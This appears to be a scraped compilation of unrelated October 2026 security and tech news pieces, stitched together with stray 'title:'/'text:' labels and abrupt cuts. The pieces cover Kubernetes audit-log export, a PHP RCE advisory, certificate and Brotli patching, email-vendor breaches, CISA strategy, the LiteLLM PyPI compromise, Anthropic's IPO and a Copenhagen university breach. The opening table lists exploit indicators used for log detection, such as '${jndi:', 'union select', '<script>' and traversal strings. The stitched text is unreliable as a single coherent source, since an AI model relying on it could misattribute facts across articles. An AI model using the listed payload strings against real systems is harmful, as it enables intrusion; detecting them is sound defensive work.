PatternWhat it usually meansBursts of 404s for /.env, /.git/config, /wp-login.php, /phpmyadminAutomated scanning../, ${jndi:, union select, <script> in the URLExploit attempts: traversal, Log4Shell, SQL injection, XSS200 on a POST to an odd file under an upload directoryPossible web shell; look at what else that IP requestedUser agents like sqlmap, nikto, nucleiTooling that didn’t bother to hideA spike of 5xx right after strange requestsSomething broke, possibly because an exploit landed

Upload. Open logtotal.com and drop in the file.

Sanitize. [what gets masked: client IPs, hostnames, usernames and tokens in URLs]. Look it over before you continue. Query strings often carry session tokens.

Review.

When it goes wrong

title: How to Export Kubernetes Audit Logs
text:
En

LogTotal HOWTO

October 26, 2026
4 min read

Where Kubernetes audit logs live depends on who runs your control plane. On a self-managed cluster, they’re a JSON-lines file on the control plane node, at whatever path –audit-log-path points to. On EKS, they go to CloudWatch Logs, on AKS to a Log Analytics workspace or storage account, and on GKE to Cloud Audit Logs. One thing holds everywhere: audit logging has to be switched on. On self-managed clusters and EKS it’s off until someone enables it.

The audit log records every request to the Kubernetes API: who ran kubectl exec into which pod, who read which secret, who bound themselves to cluster-admin. Prime Core has 93 detection rules for Kubernetes audit data, mapped to 220 MITRE ATT&CK techniques. Among them: exec into running containers (T1609), deploying rogue containers (T1610) and reading credentials through the container API (T1552.007).

Get Started for Free

Before you start

Is it enabled?

PlatformWhere to checkSelf-managed (kubeadm and similar)–audit-policy-file and –audit-log-path on the API server; with kubeadm, in /etc/kubernetes/manifests/kube-apiserver.yamlEKSCluster → Observability → control plane logging, “audit” log typeAKSDiagnostic settings on the cluster, categories kube-audit or kube-audit-adminGKEOn by default for Admin Activity; Data Access logging for Kubernetes is opt-in

If it wasn’t on, there’s nothing to export for the past, and the rest of this guide is about next time.

Detail depends on the policy. At Metadata level you see who did what to which object. At Request or RequestResponse level you also see the bodies, for example the pod spec that asked for privileged: true. Know which one you have before you go looking.

Expect volume. Controllers and service accounts talk to the API constantly. On AKS, kube-audit-admin leaves out read-only get and list calls, which keeps size sane but also hides secret reads.

Export it

Self-managed cluster, on a control plane node:

# confirm the path firstsudo grep -- '--audit-log-path' /etc/kubernetes/manifests/kube-apiserver.yamlsudo cat /var/log/kubernetes/audit/audit.log > k8s_audit.jsonl

Rotated files (from –audit-log-maxbackup) sit next to it with a timestamp in the name. Include them if the window reaches back.

EKS, from CloudWatch Logs:

aws logs filter-log-events --log-group-name /aws/eks/my-cluster/cluster \  --log-stream-name-prefix kube-apiserver-audit \  --start-time $(date -d '2026-10-19T00:00:00Z' +%s000) --end-time $(date -d '2026-10-20T00:00:00Z' +%s000) \  --output json | jq -c '.events[].message | fromjson' > eks_audit_1019.jsonl

Each CloudWatch event wraps the audit entry as a string; fromjson unwraps it. The date -d syntax is GNU; on macOS, compute the millisecond timestamps another way.

AKS, from Log Analytics (resource-specific tables):

az monitor log-analytics query -w <workspace-id> \  --analytics-query "AKSAuditAdmin | where TimeGenerated between (datetime(2026-10-19) .. datetime(2026-10-20))" \  --output json > aks_audit_1019.json

GKE, from Cloud Audit Logs:

gcloud logging read 'resource.type="k8s_cluster" AND logName:"cloudaudit.googleapis.com" AND timestamp>="2026-10-19T00:00:00Z" AND timestamp<"2026-10-20T00:00:00Z"' \  --project=my-project --format=json | jq -c '.[]' > gke_audit_1019.jsonl

title: CVE-2026-115560: New Unpatched PHP RCE Risk Requires Immediate Mitigation
text:
PHP has disclosed CVE-2026-115560, a new remote code execution risk affecting web applications that use an unusual combination of PHP session configuration and runtime behavior. The issue was disclosed on October 23, 2026, only two days after PHP released emergency fixes for the critical PHP2Shell vulnerabilities CVE-2026-109618 and CVE-2026-109619.

Unlike those earlier vulnerabilities, CVE-2026-115560 has not triggered another emergency PHP release. The PHP security team considers the vulnerable configuration unlikely in typical deployments and plans to address the flaw through its next regular bugfix cycle. Until then, administrators are advised to disable PHP’s session upload progress feature where the vulnerable configuration may exist.

The new vulnerability is also important because installing PHP 8.5.12, 8.4.27, 8.3.36, or 8.2.35—the releases that fixed the two earlier PHP2Shell flaws—does not remediate CVE-2026-115560. Fully updated systems may therefore remain exposed if their applications meet the specific configuration prerequisites.

Security teams seeking CVE-2026-115560 detection opportunities should prioritize visibility into PHP session handling, unusual multipart uploads, unexpected changes to session serialization behavior, and suspicious child processes spawned by PHP or web-server workers.

Click Explore Detections to access relevant detection content and hunting logic. To Detect CVE-2026-115560, defenders should combine PHP configuration assessment with web, endpoint, application, and reverse-proxy telemetry while a vendor patch remains unavailable.

Security practitioners can also leverage Prime Architect to transform newly disclosed vulnerability intelligence into Sigma rules and hunting queries, validate detection logic, and translate relevant detections across supported security platforms.

Contact Sales

CVE-2026-115560 analysis

PHP published an informational advisory on October 23 describing a potentially exploitable interaction between session serialization and the session upload progress feature.

According to the PHP security team, an application must satisfy several specific conditions before the issue can occur:

session.serialize_handler must initially be configured as php_binary or php_serialize.

Application code must subsequently change the handler to php at runtime using ini_set().

That change must occur before session_start() is called.

session.upload_progress.enabled must remain enabled.

Applications that never switch the serialization handler at runtime are not exposed through this specific path and can continue using session upload progress. PHP describes the vulnerable combination as uncommon.

This distinction substantially narrows the attack surface compared with CVE-2026-109618 and CVE-2026-109619. The earlier PHP2Shell vulnerabilities affected web-serving PHP installations broadly and required emergency updates. CVE-2026-115560 instead depends on application-specific configuration and code behavior.

The details for CVE-2026-115560 remain intentionally limited. PHP has not yet published the complete technical root cause, exact vulnerable version ranges, a CVSS score, or the specific internal memory or session state transition that ultimately produces the RCE condition. The vendor says those details will be included with the next regular release.

Based on the disclosed prerequisites, the vulnerability appears connected to inconsistent handling of session data when an application changes serialization formats during request processing while PHP’s upload-progress mechanism is active. However, the exact exploitation primitive should not be inferred beyond what PHP has formally disclosed.

How CIOs Can Cut the AI Uncertainty Tax
Shorter Contracts, Scenario Plans and Honest Talk Help CIOs Manage AI Volatility

Jennifer Lawinski •
October 26, 2026

Image: Shutterstock

The engineering team at Adherent, a product compliance platform vendor, a few months ago created a system of "skills" for artificial intelligence coding agents that would guide their behavior. But when the models got better, said Adherent CTO Eric Farr, the skills that once speed work up are dragging things down - and the team is tearing them out. See Also: 79% of SOCs Use AI. Only 36% Have It in Their Workflows.

"Those skills that we built to direct the model are actually getting in the way," said Farr. "They were making us better. Now they're holding back the new models."

This is planning with AI in 2026.

As models, pricing and expectations shift at a dizzying pace, executives and technology teams are struggling to keep up. Tonie Marie Gordon, author of the behavioral science newsletter Behavioral Capital, callsthe problem the "AI uncertainty tax."

She argues that stress comes from the difficulty of knowing what models will do next, what they will cost and how they will affect work.

Gordon said that individuals and organizations often show the same bias when it comes to AI. Facing ambiguous AI payoffs, some run pilot after pilot that never reaches production. Others overcommit, copying whatever a large competitor bought so the decision at least feels anchored. Both approaches, she said, are ways of escaping discomfort.

Plan for Flexibility

CIOs are feeling the pressure when it comes to making AI decisions "all the time," said Mark Moccia, vice president and research director at Forrester. Uncertainty can't be eliminated, but there are strategies that can help keep morale up and costs down.

Gordon advises tech leaders to design for reversibility. Commitments should be structured as options, rather than bets.

Moccia advises that CIOs start with reducing AI contract lengths.

"Things change every month, every week, every day," he said. "It would be irresponsible to sign any long-term deal with any of these companies, because you just don't know at what particular time which one's going to be leading."

Seasoned CIOs have extra reason for caution. Many spent years locked into legacy infrastructure and enterprise software vendors, Moccia said, and they carry "a little bit of PTSD from that."

Adherent's engineering team keeps options open by routing work across models. Engineers use the most capable and most expensive models as architects, asking them for an implementation plan. Cheaper models then write the actual code, the way a mid-level developer would.

This helps the company reduce costs. AI subscriptions bundle a fixed allotment of tokens, but usage past the cap is billed at per-token rates. To stretch capacity, engineers max out one tool's subscription before switching to the next.

"If we're delivering an order of magnitude more value to our customers, that's justified," Farr said. "If there's enough slowdowns in the rest of the system, then that spend doesn't have a clear ROI."

Mike Anderson, chief digital and information officer at Netskope, said his team tests models against everyday tasks with known answers to determine the best fit rather than defaulting to the newest, most expensive option. The tests now include open-weight models, which he said are closing the gap with frontier models, further reducing costs.

Implement Regular Planning and Review Cycles

One of the most effective ways to help stabilize strategy, Gordon said, is by softening open-ended ambiguity by stating clear risks. Leaders should elucidate what's known, what's being monitored and when plans and outputs will be revisited.

title: eMudhra, Brotli, and the Long Tail of a Security Fix
text: BackSecurity NewseMudhra, Brotli, and the Long Tail of a Security FixFixes for eMudhra and Brotli are out. Getting them everywhere they’re needed means tracking down bundled libraries, runtimes, and certificate stores.Jonathon KlobucarOct 26, 2026|6 min read How much software do you have to update to fix one vulnerability, let alone two far-reaching ones in the same week?Our corner of the internet was getting impatient waiting for Node’s eMudhra fix to drop. The certificate block had merged, and we were ready to update Node, rebuild, and move on.Then the October 21 release dropped, and we got Brotli too. That covered both problems in Node. But how much else used that same decoder? It was tucked into other applications and runtimes, and now we had more places to look. And eMudhra had its own version of the same problem. Your browser could reject the compromised certificates while a command-line tool on the same machine still trusted them. Which other programs accepted them? Which certificate stores were they using? Updating Node only covered part of it. On October 17, a researcher showed they had recovered eight eMudhra intermediate CA private keys by signing a message with each one. Scott Helme later recovered them from the public certificates on his laptop in less than a second.The values included 4, 56, and 115. These were supposed to be 384-bit private keys, with roughly 3.94 × 10¹¹⁵ possible values. The actual keys all fit in eight bits. You could try every possibility by counting to 255. eMudhra says the keys came from a flawed key-generation ceremony in April 2025 and that the intermediates never issued customer certificates. That doesn’t tell us whether someone else used them. The weak keys had gone unnoticed for nearly eighteen months.Mozilla found no certificates from those intermediates in Certificate Transparency logs at disclosure. That helps, but plenty of clients don’t require that logging. Someone could have used the keys to forge certificates those clients would accept without leaving a record in those logs.Chrome and Firefox could push out a block without waiting for an ordinary software release. Mozilla says its OneCRL update reached Firefox users with standard configurations in less than three hours. Chrome also pushed a CRLSet block that evening. The disclosure site even had a handy test for checking your browser.Outside the browser, the answer depended on which program you asked. Many clients needed a new certificate bundle or a change to their verifier. Revoking the certificates at the CA did little for clients that never checked that information.There were multiple ways to trust these certificates, too. Mozilla identified paths through three roots, including Sectigo’s AAA Certificate Services. Its advice was to block the compromised intermediates where possible. Removing the roots that trusted them was another option, but could break legitimate connections too. Removing just one might still leave another trust path open. Mozilla’s guidanceGo addressed the problem with a verifier change in versions 1.27.3 and 1.26.10. Getting that change into an application meant rebuilding it with the patched toolchain. Installing a new Go compiler would leave an existing executable exactly as it was. The Brotli advisory led to a similar search. CVE-2026-111497 could corrupt memory when an application decoded malicious compressed input. Node shipped a fix, but the vulnerable code came from Google’s Brotli library. Other projects had shipped it too. Bun was one of them. Its fetch implementation automatically decodes Brotli responses, so a server the application contacts can feed data to the decoder. Bun 1.4.4 updated the library. But if you had built an executable with bun build --compile, that executable carried its own runtime. It still needed rebuilding. Bun advisoryThen there was Python. text:
Key takeaways

In October 2026, four Japanese services that send email on behalf of other organizations disclosed breaches: Arcadia (disaster alerts for local governments), Yumil Link (Cuenote), Blastmail (a Rakus subsidiary) and Y-mail (Igreks). Earlier in the month, the ransomware attack on IDCF Cloud had stopped email delivery for several large companies.
The numbers are large. Yumil Link now counts a cumulative 51.63 million records from 49 client systems, the second-largest breach in Japan this year. Blastmail lost the details of every customer and the delivery lists of 345. Hundreds of client organizations have had to send their own notices.
In each of the four, the attackers reached the access the vendor itself uses to set up and support the environments it runs for each customer: a secret key, support staff credentials, setup scripts, API servers. In our view, that privileged path is the common weak point.
Three of the four were then used to send phishing, from the vendor's systems or under its customers' names. Email authentication does not catch this: mail sent from a hijacked legitimate environment is properly signed, and only the sender can defend against it. Phishing from domains attackers register themselves already passes DMARC more than 90% of the time, according to the Council of Anti-Phishing Japan.
If your organization sends mail through such a service, it holds your customers' data and your name. Check what it keeps, delete what you do not need, ask how its staff access the environment it runs for you, and be ready to revoke the signing keys it holds for your domain.

The U.S. cyber defense agency pledged a more aggressive posture against adversaries targeting critical infrastructure - but analysts warn that deep staffing and budget cuts likely mean the agency is unable to change course.See Also: OnDemand | The Future of Digital Assets: Trust, Regulation and Financial Innovation

The Cybersecurity and Infrastructure Security Agency published strategy Monday setting out its vision for the next four years asserting it will move from "passive defense" to "an aggressive, anticipatory stance" that eliminates adversary footholds in defense-critical infrastructure "prior to weaponization against our systems." The strategy comes after the agency lost nearly a third of its workforce since President Donald Trump returned to office and as the White House seeks to cut another $707 million from its budget.

Chris Bronk, a former U.S. diplomat who studies energy and critical infrastructure cybersecurity at the University of Houston's Hobby School of Public Affairs, recalled a dictum from former Secretary of State James A. Baker III: "Vision without resources is mere hallucination."

"Why the administration would cut CISA and reduce its staffing by as much as a third baffles me," Bronk told ISMG. "This is hard to take seriously."

Acting CISA Director Nick Andersen wrote in the strategy that the shift is meant to carry out President Trump's Cyber Strategy for America and a 2025 executive order on state and local preparedness. He added that "there is no guarantee that a strong defense will eliminate intrusions." (see: Trump's Cyber Strategy Puts Private Sector on Offensive).

Herb Lin, a senior research scholar at Stanford University's Center for International Security and Cooperation who served on President Barack Obama's Commission on Enhancing National Cybersecurity, told ISMG the strategy implies either that CISA will persuade the mostly private owners and operators of critical infrastructure to be more aggressive - or that the agency itself will hunt for and eliminate adversary access.

"CISA has been trying to persuade the owners and operators to do more for a very long time," Lin said. "I doubt that they have new arguments - but maybe they have new levers or sources of influence on these operators."

Aaron Brantly, a Virginia Tech political scientist who studies U.S. cyber strategy and has been a cyber policy fellow at the Army Cyber Institute at West Point, said budget and staffing cuts "are likely to make taking a more aggressive stance more difficult if not impossible." He added that the plan "does not call out any single specific threat as previous plans have done" and instead "attempts to convey urgency through language use."

The strategy sets a one-year timeline and tasks CISA to begin a "programmatic review" of its core services and capabilities within 60 days. The agency will then deliver an approach for implementing the strategy and measuring outcomes within 180 days, followed by a progress update within a year. CISA's previous cybersecurity strategic plan, released in 2023 under the Biden administration, paired its goals with what the agency described as specific measures of effectiveness.

Bronk said a telling indicator will be whether CISA has visited every major infrastructure operator within six months. "Beyond that, what's the tech that underwrites this 'anticipatory stance'?" he said.

Unrevoked Credential Exposed in May Enabled Repository Compromise in October

An open-source artificial intelligence model gateway allowed a threat actor to gain owner-level access to its entire GitHub repository via an exposed, unrevoked master key that set off a supply chain attack last week.See Also: On Demand | Verifying AI Agent Activity Against Your Data Policies

LiteLLM accidentally published the high-privilege credential for its Agent Platform in May and failed to revoke it. An attacker used the key to extract credentials, including LiteLLM's GitHub owner's authentication token, and pushed a malware-laden release to Python package repository PyPI in early October, LiteLLM said Friday.

The poisoned package affected more than systems actively connecting their applications to AI models through a LiteLLM gateway because it used Python startup mechanisms to execute credential-harvesting code automatically, Microsoft said Friday.

"Developer workstations, continuous integration and continuous delivery/deployment (CI/CD) agents, test environments, containers, and other systems that started Python with the affected package installed could also execute the payload," it said.

The LiteLLM Agent Platform is an "experimental project" that orchestrates agents hosted on LiteLLM's cloud infrastructure, the company said. The system was configured with an owner-level GitHub authentication token so that it can create pull requests and file them to GitHub.

A hacker on Oct. 10 logged into the platform using the previously exposed master key and extracted the GitHub CLI OAuth token. With access to all repositories, the actor used legitimate workflows to collect any other available tokens and acquired two code maintainers' - enough to bypass LiteLLM's control that requires two engineers to submit and approve a release, LiteLLM said.

The attacker rerouted the release workflow from the legitimate repository to a malicious, counterfeit one with malware. The compromised package 1.107.0 and a malicious container image were pushed on Oct. 21 and went live for about two hours, LiteLLM said.

ClickPy data quiry showed there were 50,000 downloads during that time.

The attack stayed unnoticed for at least eleven days until the malicious release because the actor added workflows to ephemeral GitHub branches that were created, used and deleted within minutes, said supply chain security firm Socket.

Cloud security firm Wiz said the payload is very likely AI-assisted, given signs such as verbose variable names in its code. The embedded credential stealer, named "privcollect" by the attacker, targets browser secrets and cookies from Chrome, Firefox, Edge and Safari, AWS credentials, Google Cloud Platform accounts and Microsoft Azure tokens from the CLI cache, it said.

"In terms of AI-specific theft, it targets API keys for OpenAI, Anthropic, Cohere, and other LLM providers stored in environment variables or config files," said Wiz threat researchers Benjamin Read and Rami McCarthy. "It also collects SSH private keys, GPG keys, and shell history files."

Exploitation of stolen credentials started about four and a half hours after exfiltration on two IP addresses, Wiz researchers said. "The attacker validated AWS instance role credentials harvested from compromised CI runners and Kubernetes nodes across multiple environments," they said.

On Unix-based systems, the malware could potentially retrieve and execute additional Python code, Microsoft said, but no such activity was detected.

"This incident has provided a strong illustration of the risks associated with failing to rotate a potentially exposed key," LiteLLM said.

Anthropic warned potential investors that it will continue to hold back models, may not recognize capability jumps that outrun safety controls and that its models may be misused, which could affect its financial position if it goes public.See Also: Securing AI Workloads With Ubuntu Pro
The frontier artificial intelligence lab, which filed its S-1 prospectus with the U.S. Securities and Exchange Commission on Monday, outlined safety and risk factors that may affect its financial health and innovation. In a lengthy section of its prospectus, Anthropic said it expects safety concerns to become "more frequent and costly" but believes they are a core competitive advantage that sets the company apart.
Anthropic's filing, and its focus on potential safety risks that could affect its financial standing, may become a template for other AI labs looking to go public. Anthropic is the first frontier lab to file an IPO as an AI-first company. Other frontier labs like Google and its parent company Alphabet, Meta and Microsoft have been listed on the Nasdaq for decades, but were not considered AI companies at their debuts (see: Anthropic's IPO Reveals $80.7B Loss, Cloud Marketplace Risk).
"We believe that frontier AI companies must invest in safety and alignment to help ensure the responsible diffusion of this technology," Anthropic said in its prospectus.
The company added that it also believes "safety, alignment and ethical behavior resonate particularly strongly with enterprises" where rigorous safeguards, predictability and accountability make up a large portion of business decisions. Anthropic has built a strong stable of enterprise customers and said in the prospectus that enterprise AI deployment "is where economic impact is greatest and where the improvement loops from customer feedback are richest."
"If the use of our AI models results in harm, whether through use by malicious actors or misuse by other third parties, or if our model guardrails or safeguards fail to prevent such misuse, our reputation and brand, business, financial condition and results of operations could be adversely affected," Anthropic said.
It added that it may continue to hold back models it believes are unsafe, pointing to the recent training pauses it undertook for Mythos 5 and the slower, vetted roll-out for its cyber-capable models under Project Glasswing.
It's no surprise that Anthropic chose to highlight safety risks in its prospectus. Former OpenAI executives founded the company after leaving because they believed OpenAI wasn't concerned enough about the dangers of the technology they were developing. Anthropic has always been vocal about the risks of the models it built, often writing about misbehaving models and the difficulty of creating safety guardrails. Dario Amodei, Anthropic's CEO, even wrote an essay describing the technology's dual risks and benefits.
Concerns about AI safety grew in the past few months after rogue AI agents from OpenAI escaped a sandbox and hacked model repository Hugging Face. Several AI safety researchers, including many from Anthropic, inflamed the debate after they claimed models being developed inside frontier AI labs "could kill humanity" and that the companies are doing nothing about it. In response, AI executives called for slower AI innovation and urged the U.S. government to encourage policies that support a slowdown. Artificial intelligence giant Anthropic filed papers Monday for what could be the biggest initial public offering of stock ever even as its top executive warns that advanced AI could pose an existential threat to humanity.

The filing sets up the San Francisco company for a Wall Street debut next month, potentially eclipsing the SpaceX initial public offering in June that raised a record $86 billion. An Anthropic IPO would also put the company ahead of OpenAI in going public in what is expected to be a pair of blockbuster stock debuts for the rival AI labs.

An IPO could provide Anthropic with enormous resources to accelerate its expansion. The amount the company ultimately raises remains uncertain, as do its final valuation and offering price, but even at lower estimates, it would turn the five-year-old startup into one of the world’s most valuable companies and potentially boost the wealth of CEO Dario Amodei and his sister and co-founder, Daniela, by billions of dollars.

The 335-page document showed Anthropic’s revenue is growing rapidly, reaching more than $16 billion in the first half of the year — 14 times its revenue from the same period last year. But like many other tech companies going public, the company behind the Claude chatbot has yet to turn a profit.

Despite the losses, Anthropic, valued earlier this year at $965 billion by private investors, is reportedly set to see that value rise to $1.5 trillion or possibly $2 trillion, although its final valuation has not been established. At $1.5 trillion, Anthropic would rank among the world’s most valuable public companies, alongside Tesla.

As for money raised, the offering could bring in as much as $100 billion, according to reports, surpassing the record set by SpaceX.

In a regulatory filing, Anthropic said it will list its stock on the Nasdaq Global Select Market under the ticker symbol “ANT.”

A Wall Street debut is planned in a jittery market

In the filing, the company said it could use some of that money on acquiring other businesses and technology as well as investing in infrastructure to grow its business to take on rivals.

Formed in 2021 by former OpenAI leaders, Anthropic is locked in a fight for dominance with that company. The two leaders, Amodei and OpenAI CEO Sam Altman, are widely seen as bitter rivals.

But they have plenty of other competitors, including Google, newer startups in the U.S. and China and SpaceX, which has an AI business. Anthropic, OpenAI and SpaceX’s AI division have all been losing more money than they make because of the huge costs of resources in building AI, fueling concerns of a bubble.

The need for cash may explain why Anthropic is rushing to tap public markets this year, and not waiting until next year, as is OpenAI’s plan. Adding to the pressure is the possibility demand for AI shares could drop, or even collapse. Investors have become jittery about the massive financing needs of the sector, and several tech companies have pulled IPO plans recently.

In addition to helping plug any cash shortfall, the IPO will shower extraordinary wealth on Anthropic’s seven founders, including Amodei and his sister. The filing didn’t directly state their ownership stakes, but other figures disclosed suggest each will end up with 1.4% of the company, a windfall of as much as $28 billion a person should the company go public at the top expected value.

Risks aplenty, but a big payoff to the founders

Dario, 43, and 39-year-old Daniela, who is Anthropic’s president, are worth $15.5 billion each, according to Forbes, which ranks them as the 176th and 177th richest in the world.

text:
“The University of Copenhagen has confirmed a cyber attack in which hackers gained access to one of the university’s test environments,” the university says.

The university's account of the intrusion
The University of Copenhagen detected the incident last Tuesday and disclosed it on Friday, saying hackers accessed one of its test environments that contained personal data for roughly 525,000 people. In an update issued yesterday, the university added that another 20,000 staff and students had their PIN codes exposed. The university says it contained the attack and blocked the attacker’s access, and that it is still investigating to determine the full extent of the incident.

What data was exposed
According to the university, the information that may have been accessed includes full names, national identity numbers (CPR), phone numbers, and email addresses. The university explicitly warns that the exposed information increases the risk of phishing and social engineering attacks and advises students and staff to be cautious of unsolicited communications and to independently verify requests.

Nubivance runs continuous compliance on Rapid7 Cyber GRC - SOC 2, HIPAA, ISO 27001, PCI, CMMC.End the scramble→PIN codes, physical access, and operational impact
In addition to personal contact and identity data, the university reported exposure of PIN codes for approximately 20,000 staff and students. As a precaution, the University of Copenhagen restricted physical access to certain critical locations on its campus and is gradually reopening them while it distributes new access codes. The university also states there is currently no indication that attackers accessed systems supporting daily operations or disrupted university activities.

Regulatory steps and legal framework
The university reported the incident to the Danish Data Protection Agency and said the breach falls within the scope of Europe’s General Data Protection Regulation (GDPR). It told stakeholders it is taking the appropriate steps with the relevant regulators and promised to provide more updates on the scope of the impact as soon as its internal investigation allows.

What this means for technologists, regulators, and students and staff

Technologists and security teams: The university’s account highlights a test-environment compromise that exposed both identity data and access credentials. The incident underscores the need to review controls around non-production environments and credential management — particularly how test data and access codes are stored and rotated — and to verify containment even after initial blocking of attacker access.
Regulators and compliance officers: The university has notified the Danish Data Protection Agency and framed the incident under GDPR. Regulators will be watching remediation steps, notification practices, and whether the university’s follow-up reporting clarifies the scope and harm to affected individuals.
